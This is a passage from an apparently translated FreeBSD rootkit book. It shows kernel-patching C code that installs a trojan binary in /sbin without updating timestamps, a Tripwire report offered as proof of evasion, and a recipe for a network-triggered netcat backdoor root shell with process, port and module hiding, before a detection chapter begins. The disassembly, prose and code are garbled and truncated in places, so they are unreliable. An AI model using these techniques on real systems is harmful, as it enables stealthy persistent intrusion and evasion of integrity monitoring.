
time[1].tv_sec = sb.st_mtime;

/* 补丁 ufsitimes */

if (kvm_write(kd, nl[0].value, ufsitimes, SIZE) < 0) { // 注意：此处原文逻辑似乎有误，此处按原意翻译

```
c0c6f66:   83 78 14 01   cmpl   $0x1,0x14(%ebx)

c0c6f6a:   74 56               je      c0c6fc2 <ufs_items+0x162>

c0c6f6c:   8b 4d f0           mov    0xfffffff0(%ebp),%ecx

c0c6f6f:   8b 83 00 00 00 00   mov    0x0(%ebx),%eax

c0c6f75:   89 c1               mov    %eax,%ecx

c0c6f77:   89 4a 30           mov    %ecx,0x30(%edx)

c0c6f7a:   c1 f9 1f           sar    $0x1f,%ecx

c0c6f7d:   89 4a 34           mov    %ecx,0x34(%edx)

c0c6f80:   8b 4b 0c           mov    0xc(%ebx),%ecx

c0c6f83:   83 78 14 01       cmpl   $0x1,0x14(%eax)

c0c6f87:   74 25               je      c0c6fae <ufs_items+0x1ae>

c0c6f89:   8b 83 00 00 00 00   mov    0x0(%ebx),%eax

c0c6f8f:   8b 4e 04           mov    0x4(%esi),%ecx

c0c6f92:   89 4a 48           mov    %ecx,0x48(%edx)

c0c6f95:   8b 53 10           mov    0x10(%ebx),%edx

c0c6f98:   e9 f6 fe ff ff     jmp    c0c6ee93 <ufs_items+0x33>

c0c6f9d:   8b 83 00 00 00 00   mov    0x0(%ebx),%eax

c0c6fa3:   8b 4d f0           mov    0xfffffff0(%ebp),%ecx

c0c6fa6:   89 4a 10           mov    %ecx,0x10(%edx)

c0c6fa9:   e9 66 ff ff ff     jmp    c0c6f014 <ufs_items+0x94>

c0c6fb3:   8b 83 00 00 00 00   mov    0x0(%ebx),%eax

c0c6fb9:   8b 4e 04           mov    0x4(%esi),%ecx

c0c6fbc:   89 4a 24           mov    %ecx,0x24(%edx)

c0c6fbf:   8b 53 10           mov    0x10(%ebx),%edx

c0c6fc2:   e9 d1 fe ff ff     jmp    c0c6ee93 <ufs_items+0x33>

c0c6fc7:   8b 83 00 00 00 00   mov    0x0(%ebx),%eax

c0c6fcd:   8b 4d f0           mov    0xfffffff0(%ebp),%ecx

c0c6fd0:   89 4a 20           mov    %ecx,0x20(%edx)

c0c6fd3:   e8 b0 ff ff ff     call   c0c6f088 <ufs_items+0x128>

c0c6fd8:   8b 83 00 00 00 00   mov    0x0(%ebx),%eax

c0c6fde:   8b 4e 04           mov    0x4(%esi),%ecx

c0c6fe1:   89 4a 1c           mov    %ecx,0x1c(%edx)

c0c6fe4:   e9 66 ff ff ff     jmp    c0c6f04f <ufs_items+0xef>

c0c6fe9:   8b 83 00 00 00 00   mov    0x0(%ebx),%eax

c0c6fef:   8b 4d f0           mov    0xfffffff0(%ebp),%ecx

c0c6ff2:   89 4a 18           mov    %ecx,0x18(%edx)

c0c6ff5:   e9 44 ff ff ff     jmp    c0c6f03e <ufs_items+0xde>

c0c6ffa:   8b 83 00 00 00 00   mov    0x0(%ebx),%eax

c0c6f00:   8b 4e 04           mov    0x4(%esi),%ecx

c0c6f03:   89 4a 14           mov    %ecx,0x14(%edx)

c0c6f06:   e9 0a ff ff ff     jmp    c0c6f015 <ufs_items+0xad>

c0c6f0b:   8d 76 00           lea    0x0(%esi),%esi

c0c6f0e:   8d bc 27 00 00 00 00 lea    0x0(%edi,%eiz,1),%edi
```

在此输出中，`DIP_SET` 的调用行以**加粗**标出，最后两行对应你想 `nop` 掉的内容。以下是得出此结论的叙述：

首先，在 `ufs_items` 函数中，`DIP_SET` 被调用了六次。因此，在汇编中有三组奇怪的指令。接下来，在 `vfs_timestamp` 之后调用。最后，因为 `vfs_timestamp` 的调用可以被忽略。`DIP_SET` 修改了参数，其汇编涉及到通用寄存器。根据这些标准，周围的两个 `mov` 指令是匹配的。

### 6.6.2 示例

列表 6-7 将 `trojan_hello` 安装到 `/sbin/` 目录，而不更新其访问、修改或更改时间。程序首先保存了 `/sbin/` 的访问和修改时间。然后补丁 `ufsitimes` 以防止更新更改时间。接下来，将二进制 `trojan_hello` 拷贝到 `/sbin/` 并回滚 `/sbin/` 的访问和修改时间。最后，恢复了 `ufsitimes`。

```c
#include <errno.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define SIZE 450
#define NAME "trojan_hello"
#define DESTINATION "/sbin/"

/* Replacement代码 */
unsigned char nop_code[] = {0x90, 0x90, 0x90}; /* nop */

int main(int argc, char *argv[]) {
    int i, offset1, offset2;
    char errbuf[POSIX_MAX];
    kvm_t *kd;
    struct nlist nl[] = {{NULL}, {NULL}};
    unsigned char ufsitimes[SIZE];
    struct stat sb;
    struct timeval time[2];

    /* 初始化内核内存 */
    kd = kvm_open(NULL, NULL, NULL, O_RDWR, errbuf);
    if (kd == NULL) {
        fprintf(stderr, "ERROR: %s\n", errbuf);
        exit(1);
    }

    nl[0].n_name = "ufsitimes";
    if (kvm_nlist(kd, nl) < 0) {
        fprintf(stderr, "ERROR: %s\n", errbuf);
        exit(1);
    }

    if (!nl[0].n_value) {
        fprintf(stderr, "ERROR %s not found\n", nl[0].n_name);
        exit(1);
    }

    /* 保存 ufsitimes 的副本 */
    if (kvm_read(kd, nl[0].n_value, ufsitimes, SIZE) < 0) {
        fprintf(stderr, "ERROR: %s\n", errbuf);
        exit(1);
    }

    /* 在 ufsitimes 中查找以下行：
     * DIP_SET(ip, ctime, ts.sec);
     * DIP_SET(ip, mtime, ts.nsec);
     */
    for (i = 0; i < SIZE - 2; i++) {
        if (ufsitimes[i] == 0x89 &&
            ufsitimes[i+1] == 0x42 &&
            ufsitimes[i+2] == 0x30) {
            offset1 = i;
        }
        if (ufsitimes[i] == 0x89 &&
            ufsitimes[i+1] == 0x4a &&
            ufsitimes[i+2] == 0x34) {
            offset2 = i;
        }
    }

    /* 保存 /sbin/bin 的访问和修改时间 */
    if (stat("/sbin/bin", &sb) < 0) {
        fprintf(stderr, "STAT ERROR: %d\n", errno);
        exit(1);
    }

    time[0].tv_sec = sb.st_atime;
    time[1].tv_sec = sb.st_mtime;

    /* 补丁 ufsitimes */
    if (kvm_write(kd, nl[0].n_value, ufsitimes, SIZE) < 0) { // 注意：此处原文逻辑似乎有误，此处按原意翻译
```

愿黑客与你同在！

```
$ sudo tripwire --check
解析策略文件: /usr/local/etc/tripwire.tw.pol
*** 处理 Unix 文件系统 ***
正在执行完整性检查...
写入报告文件: /var/db/tripwire/report/slavetwo-20070305-074918.twr

# Tripwire(R) 2.3.0 完整性检查报告

报告生成者：      root
创建时间：      2007年3月5周一 07:49:18
数据库最后更新：  2007年3月5周一 07:28:11
```

扫描对象总数：69628
发现违规总数：0

======================================================================================

# 对象摘要：
====================================================================================

# 章节：Unix 文件系统
------------------------------------------------------------------------------------------------

无违规。
======================================================================================

# 错误报告：
======================================================================================

无错误

*** 报告结束 ***
----------------------------------------------------------------------------------------------------------------

> Tripwire 2.3 Portions copyright 2000 Tripwire, Inc. Tripwire 是 Tripwire, Inc. 的注册商标。本软件不提供`任何`保证；详情请使用 `--version`。此软件为免费软件，仅在特定条件下可重新分发或修改；详情请参阅 COPYING 文件。
版权所有。
完整性检查完成。

太棒了——Tripwire 报告未发现违规。
当然，你仍然可以做更多工作来改进这个 rootkit。例如，你可以掩盖系统调用钩子（如第 5.7 节所述）。

- 注意：离线分析本可以检测出该木马；毕竟，如果系统没有运行，你就无法躲在系统内部！

## 6.8 结语

本章的目的（无论你信不信）并不是为了诋毁 HID，而是为了展示通过结合全书中描述的所有技术可以实现什么。为了好玩起见，这里有另一个例子。

将第 2 章的 `icmp_input_hook` 代码与本章的 `execve_hook` 代码部分结合，创建一个能够执行用户态进程（如 netcat）以生成后门 root shell 的“网络触发器”。然后，将其与第 3 章的 `process_hiding` 和 `port_hiding` 代码结合，以隐藏 root shell 和连接。包含本章中的模块隐藏例程以隐藏 rootkit 本身。为了安全起见，再加入 netcat 的 `getdirentries_hook` 代码。

当然，这个 rootkit 还可以改进。例如，由于许多管理员将他们的防火墙/数据包过滤器设置为丢弃入站的 ICMP 数据包，可以考虑挂钩不同的 `*_input` 函数，例如 `tcp_input`。

# 7 检测

![](img/bfd792ec0e2d264dd5185dbb1d3a3b80_138_0.png)

我们现在进入充满挑战的 rootkit 检测世界。通常情况下，你可以通过两种方式之一检测 rootkit：通过特征码，或者通过行为。*通过特征码检测*涉及扫描操作系统以寻找特定的 rootkit 特性（例如内联函数钩子）。*通过行为检测*涉及捕获操作系统的“撒谎”（例如，`sockstat(1)` 列出了两个打开的端口，但端口扫描显示有三个）。

在本章中，你将学习如何检测全书中描述的各种 rootkit 技术。但请记住，rootkit 和 rootkit 检测器之间处于永恒的军备竞赛中。当一方开发出新技术时，另一方就会开发出对抗技术。换句话之，今天有效的方法明天可能就不灵了。

### 7.1 检测调用钩子

如第 2 章所述，调用钩子实际上是关于重定向函数指针的。因此，要检测调用钩子，只需要确定函数指针是否仍然指向其原始函数。例如，你可以通过检查其系统结构 `sys_call` 成员来确定 `mkdir` 系统调用是否被挂钩。如果它指向 `mkdir`以外的任何函数，你就发现了一个调用钩子。

### 7.1.1 寻找系统调用钩子

列表 7-1 是一个旨在寻找（并卸载）系统调用钩子的简单程序。该程序带有两个参数被调用：要检查的系统调用名称及其对应的系统调用号。它还有一个可选的第三个参数，字符串 `"fix"`，如果发现钩子，它将恢复原始系统调用函数。

> 注意：以下程序实际上是 `checkcall.c`；我做了一些细微修改，使其在 FreeBSD 6 下可以顺利编译。我还做了一些外观上的修改，使其在打印时看起来更好。

```c
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/sysent.h>

void usage();

int main(int argc, char *argv[]) {
    char errbuf[POSIX2_LINE_MAX];
    kvm_t *kd;
    struct nlist nl[] = {{NULL}, {NULL}, {NULL}, {NULL}};
    unsigned long addr;
    int callnum;
    struct sysent call;

    /* 检查参数。 */
    if (argc < 3) {
        usage();
        exit(-1);
    }

    nl[0].n_name = "sysent";
    nl[1].n_name = argv[1];
    callnum = (int)strtol(argv[2], (char **)NULL, 10);

    printf("Checking system call %d: %s\n\n", callnum, argv[1]);
```
